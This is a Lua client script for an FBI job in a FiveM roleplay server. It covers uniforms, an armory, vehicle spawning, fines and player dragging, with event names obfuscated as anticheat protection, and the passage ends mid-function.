-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local PlayerData = {}

local HasAlreadyEnteredMarker = false

local LastStation = nil
local LastPart = nil
local LastPartNum = nil
local LastEntity = nil

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local playerInService = false
local hasAlreadyJoined = false

local isDead = false
local CurrentTask = {}

local DragStatus = {}
DragStatus.isDragged = false
DragStatus.dragger = tonumber(draggerId)

shieldActive = false
shieldEntity = nil

Citizen.CreateThread(function()
        while ESX == nil do
                TriggerEvent('::{ayzwen}::esx:getSharedObject', function(obj) ESX = obj end)
                Citizen.Wait(0)
        end

        while ESX.GetPlayerData().job == nil do
                Citizen.Wait(10)
        end

        PlayerData = ESX.GetPlayerData()
end)

function SetVehicleMaxMods(vehicle)
        local props = {
                fuelLevel = 100,
                modWindows = 100,
                dirtLevel = 0,
                modEngine = 4,
                modBrakes = 4,
                modTransmission = 4,
                modSuspension = 4,
                modTurbo = true,
                color1 = 12,
                color2 = 12
        }

        ESX.Game.SetVehicleProperties(vehicle, props)
end

function cleanPlayer(playerPed)
        SetPedArmour(playerPed, 0)
        ClearPedBloodDamage(playerPed)
        ResetPedVisibleDamage(playerPed)
        ClearPedLastWeaponDamage(playerPed)
        ResetPedMovementClipset(playerPed, 0.0)
end

function setUniform(job, playerPed)
        TriggerEvent('::{ayzwen}::skinchanger:getSkin', function(skin)
                if skin.sex == 0 then
                        if Config.Uniforms[job].male ~= nil then
                                TriggerEvent('::{ayzwen}::skinchanger:loadClothes', skin, Config.Uniforms[job].male)
                        else
                                ESX.ShowNotification(_U('no_outfit'))
                        end
                else
                        if Config.Uniforms[job].female ~= nil then
                                TriggerEvent('::{ayzwen}::skinchanger:loadClothes', skin, Config.Uniforms[job].female)
                        else
                                ESX.ShowNotification(_U('no_outfit'))
                        end
                end
        end)
end

function OpenCloakroomMenu()
        local playerPed = PlayerPedId()
        local grade = PlayerData.job.grade_name
        local elements = {}

        table.insert(elements, {label = _U('fbi_wear'), value = 'recruit_wear'})

--      table.insert(elements, {label = 'Mettre un Gilet Cadet', value = 'gilet_wear'})
        --table.insert(elements, {label = 'Enlever le Gilet Cadet', value = 'gilet_wear1'})

        table.insert(elements, {label = 'Mettre son Gilet pare-balle', value = 'bullet_wear'})
        --table.insert(elements, {label = 'Enlever son Gilet pare-balle', value = 'bullet_wear1'})

        --table.insert(elements, {label = 'Tenue Anti-émeute', value = 'emeute_wear'})
        --table.insert(elements, {label = 'Tenue du S.W.A.T', value = 'inter_wear'})
        --table.insert(elements, {label = 'Tenue de Cérémonie', value = 'ceremonie_wear'})
        --table.insert(elements, {label = 'Tenue du Commandant', value = 'boss_wear'})

        table.insert(elements, {label = 'Fin de Service', value = 'citizen_wear'})

        ESX.UI.Menu.CloseAll()

        ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'cloakroom', {
                title = _U('cloakroom'),
                elements = elements
        }, function(data, menu)
                cleanPlayer(playerPed)

                if data.current.value == 'citizen_wear' then
                        ESX.TriggerServerCallback('::{ayzwen}::esx_skin:getPlayerSkin', function(skin)
                                TriggerEvent('::{ayzwen}::skinchanger:loadSkin', skin)
                        end)
                end

                if
                        data.current.value == 'recruit_wear' or
                        data.current.value == 'officer_wear' or
                        data.current.value == 'sergeant_wear' or
                        data.current.value == 'intendent_wear' or
                        data.current.value == 'lieutenant_wear' or
                        data.current.value == 'chef_wear' or
                        data.current.value == 'boss_wear' or
                        data.current.value == 'bullet_wear' or
                        data.current.value == 'gilet_wear' or
                        data.current.value == 'gilet_wear1' or
                        data.current.value == 'bullet_wear1' or
                        data.current.value == 'emeute_wear' or
                        data.current.value == 'ceremonie_wear' or
                        data.current.value == 'inter_wear'
                then
                        setUniform(data.current.value, playerPed)
                end
        end, function(data, menu)
                CurrentAction = 'menu_cloakroom'
                CurrentActionMsg = _U('open_cloackroom')
                CurrentActionData = {}
        end)
end

function OpenArmoryMenu(station)
        local elements = {
                {label = _U('buy_weapons'), value = 'buy_weapons'},
                {label = _U('get_weapon'), value = 'get_weapon'},
                {label = _U('put_weapon'), value = 'put_weapon'},
                {label = _U('remove_object'), value = 'get_stock'},
                {label = _U('deposit_object'), value = 'put_stock'}
        }

        ESX.UI.Menu.CloseAll()

        ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory', {
                title = _U('armory'),
                elements = elements
        }, function(data, menu)
                if data.current.value == 'buy_weapons' then
                        OpenBuyWeaponsMenu(station)
                end

                if data.current.value == 'get_weapon' then
                        OpenGetWeaponMenu()
                end

                if data.current.value == 'put_weapon' then
                        OpenPutWeaponMenu()
                end

                if data.current.value == 'get_stock' then
                        OpenGetStocksMenu()
                end

                if data.current.value == 'put_stock' then
                        OpenPutStocksMenu()
                end
        end, function(data, menu)
                CurrentAction = 'menu_armory'
                CurrentActionMsg = _U('open_armory')
                CurrentActionData = {station = station}
        end)
end

function OpenVehicleSpawnerMenu(station, partNum)
        local vehicles = Config.FbiStations[station].Vehicles
        ESX.UI.Menu.CloseAll()

        if Config.EnableSocietyOwnedVehicles then
                local elements = {}

                ESX.TriggerServerCallback('::{ayzwen}::esx_society:getVehiclesInGarage', function(garageVehicles)
                        for i = 1, #garageVehicles, 1 do
                                table.insert(elements, {label = GetDisplayNameFromVehicleModel(garageVehicles[i].model), rightlabel = {'[' .. garageVehicles[i].plate .. ']'}, value = garageVehicles[i]})
                        end

                        ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_spawner', {
                                title = _U('vehicle_menu'),
                                elements = elements
                        }, function(data, menu)
                                menu.close()

                                ESX.Game.SpawnVehicle(data.current.value.model, vehicles[partNum].SpawnPoint, vehicles[partNum].Heading, function(vehicle)
                                        ESX.Game.SetVehicleProperties(vehicle, data.current.value)
                                end)

                                _TriggerServerEvent('::{ayzwen}::esx_society:removeVehicleFromGarage', 'fbi', data.current.value)
                        end, function(data, menu)
                                CurrentAction = 'menu_vehicle_spawner'
                                CurrentActionMsg = _U('vehicle_spawner')
                                CurrentActionData = {station = station, partNum = partNum}
                        end)
                end, 'fbi')
        else
                local elements = {}
                local authorizedVehicles = Config.AuthorizedVehicles[PlayerData.job.grade_name]

                for i = 1, #authorizedVehicles, 1 do
                        table.insert(elements, {label = authorizedVehicles[i].label, model = authorizedVehicles[i].model})
                end

                ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_spawner', {
                        title = _U('vehicle_menu'),
                        elements = elements
                }, function(data, menu)
                        menu.close()

                        local model = data.current.model
                        local vehicle = GetClosestVehicle(vehicles[partNum].SpawnPoint, 3.0, 0, 71)

                        if not DoesEntityExist(vehicle) then
                                local playerPed = PlayerPedId()

                                if Config.MaxInService == -1 then
                                        ESX.Game.SpawnVehicle(model, vehicles[partNum].SpawnPoint, vehicles[partNum].Heading, function(vehicle)
                                                local newPlate = exports['esx_vehicleshop']:GenerateSocietyPlate('FBI')                                                SetVehicleNumberPlateText(vehicle, newPlate)
                                                _TriggerServerEvent('::{ayzwen}::esx_vehiclelock:givekey', 'no', newPlate)
                                                SetVehicleMaxMods(vehicle)
                                        end)
                                else
                                        ESX.TriggerServerCallback('::{ayzwen}::esx_service:isInService', function(isInService)
                                                if isInService then
                                                        ESX.Game.SpawnVehicle(model, vehicles[partNum].SpawnPoint, vehicles[partNum].Heading, function(vehicle)
                                                                local newPlate = exports['esx_vehicleshop']:GenerateSocietyPlate('FBI')
                                                                SetVehicleNumberPlateText(vehicle, newPlate)
                                                                _TriggerServerEvent('::{ayzwen}::esx_vehiclelock:givekey', 'no', newPlate)
                                                                SetVehicleMaxMods(vehicle)
                                                        end)
                                                else
                                                        ESX.ShowNotification(_U('service_not'))
                                                end
                                        end, 'fbi')
                                end
                        else
                                ESX.ShowNotification(_U('vehicle_out'))
                        end
                end, function(data, menu)
                        CurrentAction = 'menu_vehicle_spawner'
                        CurrentActionMsg = _U('vehicle_spawner')
                        CurrentActionData = {station = station, partNum = partNum}
                end)
        end
end

function OpenFineMenu(player)
        ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'fine', {
                title = _U('fine'),
                elements = {
                        {label = _U('traffic_offense'), value = 0},
                        {label = _U('minor_offense'), value = 1},
                        {label = _U('average_offense'), value = 2},
                        {label = _U('major_offense'), value = 3}
                }
        }, function(data, menu)
                OpenFineCategoryMenu(player, data.current.value)
        end, function(data, menu)
        end)
end

function OpenFineCategoryMenu(player, category)
        ESX.TriggerServerCallback('::{ayzwen}::esx_fbijob:getFineList', function(fines)
                local elements = {}

                for i = 1, #fines, 1 do
                        table.insert(elements, {
                                label = fines[i].label,
                                rightlabel = {'$' .. fines[i].amount},
                                value = fines[i].id,
                                amount = fines[i].amount,
                                fineLabel = fines[i].label
                        })
                end

                ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'fine_category', {
                        title = _U('fine'),
                        elements = elements
                }, function(data, menu)
                        menu.close()

                        if Config.EnablePlayerManagement then
                                _TriggerServerEvent('::{ayzwen}::esx_billing:sendBill', GetPlayerServerId(player), 'society_fbi', _U('fine_total', data.current.fineLabel), data.current.amount)
                        else
                                _TriggerServerEvent('::{ayzwen}::esx_billing:sendBill', GetPlayerServerId(player), '', _U('fine_total', data.current.fineLabel), data.current.amount)
                        end

                        ESX.SetTimeout(300, function()
                                OpenFineCategoryMenu(player, category)
                        end)
                end, function(data, menu)
                end)
        end, category)
end

function LookupVehicle()
        ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'lookup_vehicle', {
                title = _U('search_database_title')
        }, function(data, menu)
                if (data.value == nil) or (string.len(data.value) ~= 8) then
                        ESX.ShowNotification(_U('search_database_error_invalid'))
                else
                        ESX.TriggerServerCallback('::{ayzwen}::esx_fbijob:getVehicleFromPlate', function(owner, found)
                                if found then
                                        ESX.ShowNotification(_U('search_database_found', owner))
                                else
                                        ESX.ShowNotification(_U('search_database_error_not_found'))
                                end
                        end, data.value)

                        menu.close()
                end
        end, function(data, menu)
        end)
end

function ShowPlayerLicense(player)
        local elements = {}

        ESX.TriggerServerCallback('::{ayzwen}::esx_fbijob:getOtherPlayerData', function(data)
                if data.licenses ~= nil then
                        for i = 1, #data.licenses, 1 do
                                if data.licenses[i].label ~= nil and data.licenses[i].type ~= nil then
                                        table.insert(elements, {label = data.licenses[i].label, value = data.licenses[i].type})
                                end
                        end
                end

                local targetName = (data.firstname or 'Inconnu') .. ' ' .. (data.lastname or 'Inconnu')

                ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'manage_license', {
                        title = _U('license_revoke'),
                        elements = elements
                }, function(data, menu)
                        ESX.ShowNotification(_U('licence_you_revoked', data.current.label, targetName))
                        _TriggerServerEvent('::{ayzwen}::esx_fbijob:message', GetPlayerServerId(player), _U('license_revoked', data.current.label))
                        _TriggerServerEvent('::{ayzwen}::esx_license:removeLicense', GetPlayerServerId(player), data.current.value)

                        ESX.SetTimeout(300, function()
                                ShowPlayerLicense(player)
                        end)
                end, function(data, menu)
                end)
        end, GetPlayerServerId(player))
end

function OpenUnpaidBillsMenu(player)
        local elements = {}

        ESX.TriggerServerCallback('::{ayzwen}::esx_billing:getTargetBills', function(bills)
                for i = 1, #bills, 1 do
                        table.insert(elements, {label = bills[i].label, rightlabel = {'$' .. bills[i].amount}, value = bills[i].id})
                end

                ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'billing', {
                        title = _U('unpaid_bills'),
                        elements = elements
                }, function(data, menu)
                end, function(data, menu)
                end)
        end, GetPlayerServerId(player))
end

function OpenVehicleInfosMenu(vehicleData)
        ESX.TriggerServerCallback('::{ayzwen}::esx_fbijob:getVehicleInfos', function(retrivedInfo)
                local elements = {}

                table.insert(elements, {label = _U('plate', retrivedInfo.plate), value = nil})

                if retrivedInfo.owner == nil then
                        table.insert(elements, {label = _U('owner_unknown'), value = nil})
                else
                        table.insert(elements, {label = _U('owner', retrivedInfo.owner), value = nil})
                end

                ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_infos', {
                        title = _U('vehicle_info'),
                        elements = elements
                }, nil, function(data, menu)
                end)
        end, vehicleData.plate)
end

function OpenGetWeaponMenu()
        ESX.TriggerServerCallback('::{ayzwen}::esx_fbijob:getArmoryWeapons', function(weapons)
                local elements = {}

                for i = 1, #weapons, 1 do
                        if weapons[i].count > 0 then
                                table.insert(elements, {label = ESX.GetWeaponLabel(weapons[i].name), rightlabel = {'[' .. weapons[i].count .. ']'}, value = weapons[i].name})
                        end
                end

                ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory_get_weapon', {
                        title = _U('get_weapon_menu'),
                        elements = elements
                }, function(data, menu)
                        menu.close()

                        ESX.TriggerServerCallback('::{ayzwen}::esx_fbijob:removeArmoryWeapon', function()
                                OpenGetWeaponMenu()
                        end, data.current.value)
                end, function(data, menu)
                end)
        end)
end

function OpenPutWeaponMenu()
        local elements = {}
        local playerPed = PlayerPedId()
        local weaponList = ESX.GetWeaponList()

        for i = 1, #weaponList, 1 do
                local weaponHash = GetHashKey(weaponList[i].name)

                if HasPedGotWeapon(playerPed, weaponHash, false) and weaponList[i].name ~= 'WEAPON_UNARMED' then
                        table.insert(elements, {label = weaponList[i].label, value = weaponList[i].name})
                end
        end

        ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory_put_weapon', {
                title = _U('put_weapon_menu'),
                elements = elements
    }, function(data, menu)
                menu.close()

                ESX.TriggerServerCallback('::{ayzwen}::esx_fbijob:addArmoryWeapon', function()
                        OpenPutWeaponMenu()
                end, data.current.value, true)
        end, function(data, menu)
        end)
end

function OpenBuyWeaponsMenu()
        local elements = {}
        local playerPed = PlayerPedId()
        PlayerData = ESX.GetPlayerData()

        for k, v in ipairs(Config.AuthorizedWeapons[PlayerData.job.grade_name]) do
                local weaponNum, weapon = ESX.GetWeapon(v.weapon)
                local components, label = {}
                local hasWeapon = HasPedGotWeapon(playerPed, GetHashKey(v.weapon), false)

                if v.components then
                        for i = 1, #v.components do
                                if v.components[i] then
                                        local component = weapon.components[i]
                                        local hasComponent = HasPedGotWeaponComponent(playerPed, GetHashKey(v.weapon), component.hash)

                                        if hasComponent then
                                                label = component.label
                                                rightlabel = {_U('armory_owned')}
                                        else
                                                if v.components[i] > 0 then
                                                        label = component.label
                                                        rightlabel = {_U('armory_item', ESX.Math.GroupDigits(v.components[i]))}
                                                else
                                                        label = component.label
                                                        rightlabel = {_U('armory_free')}
                                                end
                                        end

                                        table.insert(components, {
                                                label = label,
                                                rightlabel = rightlabel,
                                                componentLabel = component.label,
                                                hash = component.hash,
                                                name = component.name,
                                                price = v.components[i],
                                                hasComponent = hasComponent,
                                                componentNum = i
                                        })
                                end
                        end
                end

                if hasWeapon and v.components then
                        label = weapon.label
                        rightlabel = {'>'}
                elseif hasWeapon and not v.components then
                        label = weapon.label
                        rightlabel = {_U('armory_owned')}
                else
                        if v.price > 0 then
                                label = weapon.label
                                rightlabel = {_U('armory_item', ESX.Math.GroupDigits(v.price))}
                        else
                                label = weapon.label
                                rightlabel = {_U('armory_free')}
                        end
                end

                table.insert(elements, {
                        label = label,
                        rightlabel = rightlabel,
                        weaponLabel = weapon.label,
                        name = weapon.name,
                        components = components,
                        price = v.price,
                        hasWeapon = hasWeapon
                })
        end

        ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory_buy_weapons', {
                title = _U('armory_weapontitle'),
                elements = elements
        }, function(data, menu)
                if data.current.hasWeapon then
                        if #data.current.components > 0 then
                                OpenWeaponComponentShop(data.current.components, data.current.name, menu)
                        end
                else
                        ESX.TriggerServerCallback('::{ayzwen}::esx_fbijob:buyWeapon', function(bought)
                                if bought then
                                        if data.current.price > 0 then
                                                ESX.ShowNotification(_U('armory_bought', data.current.weaponLabel, ESX.Math.GroupDigits(data.current.price)))
                                        end

                                        menu.close()
                                        OpenBuyWeaponsMenu()
                                else
                                        ESX.ShowNotification(_U('armory_money'))
                                end
                        end, data.current.name, 1)
                end
        end, function(data, menu)
        end)
end

function OpenWeaponComponentShop(components, weaponName, parentShop)
        ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory_buy_weapons_components', {
                title = _U('armory_componenttitle'),
                elements = components
        }, function(data, menu)
                if data.current.hasComponent then
                        ESX.ShowNotification(_U('armory_hascomponent'))
                else
                        ESX.TriggerServerCallback('::{ayzwen}::esx_fbijob:buyWeapon', function(bought)
                                if bought then
                                        if data.current.price > 0 then
                                                ESX.ShowNotification(_U('armory_bought', data.current.componentLabel, ESX.Math.GroupDigits(data.current.price)))
                                        end

                                        menu.close()
                                        parentShop.close()
                                        OpenBuyWeaponsMenu()
                                else
                                        ESX.ShowNotification(_U('armory_money'))
                                end
                        end, weaponName, 2, data.current.componentNum)
                end
        end, function(data, menu)
                menu.close()
        end)
end

function OpenGetStocksMenu()
        ESX.TriggerServerCallback('::{ayzwen}::esx_fbijob:getStockItems', function(items)
                local elements = {}

                for i = 1, #items, 1 do
                        table.insert(elements, {label = items[i].label, rightlabel = {'(' .. items[i].count .. ')'}, value = items[i].name})
                end

                ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
                        title = _U('fbi_stock'),
                        elements = elements
                }, function(data, menu)
                        ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_get_item_count', {
                                title = _U('quantity')
                        }, function(data2, menu2)
                                local count = tonumber(data2.value)

                                if count == nil then
                                        ESX.ShowNotification(_U('quantity_invalid'))
                                else
                                        menu2.close()
                                        menu.close()
                                        _TriggerServerEvent('::{ayzwen}::esx_fbijob:getStockItem', data.current.value, count)

                                        Citizen.Wait(300)
                                        OpenGetStocksMenu()
                                end
                        end, function(data2, menu2)
                                menu2.close()
                        end)
                end, function(data, menu)
                end)
        end)
end

function OpenPutStocksMenu()
        ESX.TriggerServerCallback('::{ayzwen}::esx_fbijob:getPlayerInventory', function(inventory)
                local elements = {}

                for i = 1, #inventory.items, 1 do
                        local item = inventory.items[i]

                        if item.count > 0 then
                                table.insert(elements, {label = item.label, rightlabel = {'(' .. item.count .. ')'}, type = 'item_standard', value = item.name})
                        end
                end

                ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
                        title = _U('inventory'),
                        elements = elements
                }, function(data, menu)
                        local itemName = data.current.value

                        ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_put_item_count', {
                                title = _U('quantity')
                        }, function(data2, menu2)
                                local count = tonumber(data2.value)

                                if count == nil then
                                        ESX.ShowNotification(_U('quantity_invalid'))
                                else
                                        menu2.close()
                                        menu.close()
                                        _TriggerServerEvent('::{ayzwen}::esx_fbijob:putStockItems', itemName, count)

                                        Citizen.Wait(300)
                                        OpenPutStocksMenu()
                                end
                        end, function(data2, menu2)
                                menu2.close()
                        end)
                end, function(data, menu)
                end)
        end)
end

RegisterNetEvent('::{ayzwen}::esx:setJob')
AddEventHandler('::{ayzwen}::esx:setJob', function(job)
        PlayerData.job = job
end)

RegisterNetEvent('::{ayzwen}::esx_phone:loaded')
AddEventHandler('::{ayzwen}::esx_phone:loaded', function(phoneNumber, contacts)
        local specialContact = {
                name = _U('phone_fbi'),
                number = 'fbi',
                base64Icon = 'data:image/png;base64,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'
        }

        TriggerEvent('::{ayzwen}::esx_phone:addSpecialContact', specialContact.name, specialContact.number, specialContact.base64Icon)
end)

AddEventHandler('::{ayzwen}::esx_phone:cancelMessage', function(dispatchNumber)
        if type(PlayerData.job.name) == 'string' and PlayerData.job.name == 'fbi' and PlayerData.job.name == dispatchNumber then
                if Config.MaxInService ~= -1 and not playerInService then
                        CancelEvent()
                end
        end
end)

AddEventHandler('::{ayzwen}::esx_fbijob:hasEnteredMarker', function(station, part, partNum)
  if part == 'Cloakroom' then
    CurrentAction = 'menu_cloakroom'
    CurrentActionMsg = _U('open_cloackroom')
    CurrentActionData = {}
  end

  if part == 'Armory' then
    CurrentAction = 'menu_armory'
    CurrentActionMsg = _U('open_armory')
    CurrentActionData = {station = station}
  end

  if part == 'VehicleSpawner' then
    CurrentAction = 'menu_vehicle_spawner'
    CurrentActionMsg = _U('vehicle_spawner')
    CurrentActionData = {station = station, partNum = partNum}
  end

  if part == 'HelicopterSpawner' then
    local helicopters = Config.FbiStations[station].Helicopters

    if not IsAnyVehicleNearPoint(helicopters[partNum].SpawnPoint, 3.0) then
      ESX.Game.SpawnVehicle('fibfrogger', helicopters[partNum].SpawnPoint, helicopters[partNum].Heading, function(vehicle)
        SetVehicleModKit(vehicle, 0)
        SetVehicleLivery(vehicle, 0)
      end)
    end
  end

  if part == 'VehicleDeleter' then
    local playerPed = PlayerPedId()
    local coords = GetEntityCoords(playerPed, false)

    if IsPedInAnyVehicle(playerPed,  false) then
      local vehicle = GetVehiclePedIsIn(playerPed, false)

      if DoesEntityExist(vehicle) then
        CurrentAction = 'delete_vehicle'
        CurrentActionMsg = _U('store_vehicle')
        CurrentActionData = {vehicle = vehicle}
      end
    end
  end

  if part == 'BossActions' then
    CurrentAction = 'menu_boss_actions'
    CurrentActionMsg = _U('open_bossmenu')
    CurrentActionData = {}
  end
end)

AddEventHandler('::{ayzwen}::esx_fbijob:hasExitedMarker', function(station, part, partNum)
        ESX.UI.Menu.CloseAll()
        CurrentAction = nil
end)

AddEventHandler('::{ayzwen}::esx_fbijob:hasEnteredEntityZone', function(entity)
        local playerPed = PlayerPedId()

        if PlayerData.job ~= nil and PlayerData.job.name == 'fbi' and not IsPedInAnyVehicle(playerPed, false) then
                CurrentAction = 'remove_entity'
                CurrentActionMsg = _U('remove_prop')
                CurrentActionData = {entity = entity}
        end

        if GetEntityModel(entity) == `p_ld_stinger_s` then
                local playerPed = PlayerPedId()
                local coords = GetEntityCoords(playerPed, false)

                if IsPedInAnyVehicle(playerPed,  false) then
                        local vehicle = GetVehiclePedIsIn(playerPed)

                        for i = 0, 7, 1 do
                                SetVehicleTyreBurst(vehicle,  i,  true,  1000)
                        end
                end
        end
end)

AddEventHandler('::{ayzwen}::esx_fbijob:hasExitedEntityZone', function(entity)
        if CurrentAction == 'remove_entity' then
                CurrentAction = nil
        end
end)

RegisterNetEvent('::{ayzwen}::esx_fbijob:drag')
AddEventHandler('::{ayzwen}::esx_fbijob:drag', function(draggerId)
        DragStatus.isDragged = not DragStatus.isDragged
        DragStatus.dragger = tonumber(draggerId)

        if not DragStatus.isDragged then
                DetachEntity(PlayerPedId(), true, false)
        end
end)

Citizen.CreateThread(function()
        while true do
                Citizen.Wait(0)
                local plyPed = PlayerPedId()

                if DragStatus.isDragged then
                        local target = GetPlayerFromServerId(DragStatus.dragger)

                        if target ~= PlayerId() and target > 0 then
                                local targetPed = GetPlayerPed(target)

                                if not IsPedSittingInAnyVehicle(targetPed) then
